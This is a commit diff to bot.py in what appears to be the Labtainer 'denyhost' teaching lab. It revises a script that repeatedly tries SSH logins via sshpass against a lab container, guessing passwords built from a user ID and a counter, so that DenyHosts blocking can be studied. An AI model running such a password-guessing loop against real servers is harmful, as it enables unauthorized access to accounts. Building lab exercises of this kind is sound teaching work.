b59cfa8c79336b1a24b0957a8a94a94b5a4a6606
(no author) <(no author)@ed162e55-3153-4343-a18d-e086fa355ed4>
2018-01-16 00:39:08 +0000

    clarify use of denyhosts; revise scheme for fixing locked-out user; no treataslocal; point to config files; show diff between valid and invalid user ids
    git-svn-id: https://tor.ern.nps.edu/svn/proj/labtainer/trunk@1293 ed162e55-3153-4343-a18d-e086fa355ed4

--- labs/denyhost/client/bot.py
+++ labs/denyhost/client/bot.py
@@ -9,22 +9,27 @@ import logging
 
 ON_POSIX = 'posix' in sys.builtin_module_names
 
-def doLogin(passwd):
+def doLogin(uid, passwd):
     retval = True
-    logging.debug("in doLogin")
-    command = 'sshpass -p"%s" ssh -tt ubuntu@172.20.0.3' % passwd
+    logging.debug("in doLogin for %s %s" % (uid, passwd))
+    command = 'sshpass -p"%s" ssh -tt %s@172.20.0.3 exit' % (passwd, uid)
     #print "command is (%s)" % command
     p = Popen(command, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE, bufsize=1, close_fds=ON_POSIX)
 
-    logging.debug("after start")
-    got = p.stderr.read()
+    logging.debug("after cmd: %s" % command)
+    output = p.communicate()
+    got = output[1]
+    #got = p.stderr.read()
     #print "Got is (%s)" % got
+    logging.debug('stderr read, %s' % got)
     if 'Permission denied' in got:
         #print('login incorrect')
         retval = False
-    if 'Connection closed' in got:
+    elif 'Connection closed' in got:
         #print('Connection closed triggered')
         retval = True
+    else:
+        print('Sucess!')
     return retval, p
 
 
@@ -32,20 +37,20 @@ def doLogin(passwd):
 First loging and chnage the password.  NEWPWD should be replaced by
 a student-specific value.
 '''
+if len(sys.argv) != 2:
+    print('./bot.py <User ID>')
 LOGFILE = "/tmp/bot.log"
 logging.basicConfig(filename=LOGFILE, level=logging.DEBUG)
-logging.debug("hi")
-newpwd = 'NEWPWD'
+uid = sys.argv[1]
 count = 1
 while True:
-    testpwd = '%s%s' % (newpwd, count)
-    #print "testpwd is %s" % testpwd
-    result, p = doLogin(testpwd)
+    testpwd = '%s%s' % (uid, count)
+    result, p = doLogin(uid, testpwd)
     if result:
         print "Got Connection closed"
         break
     else:
-        print "Still permission denied, count=%s" % count
+        print("try user: %s passwd: %s -- permission denied, count=%s" % (uid, testpwd, count))
     p.wait()
     count = count + 1
 
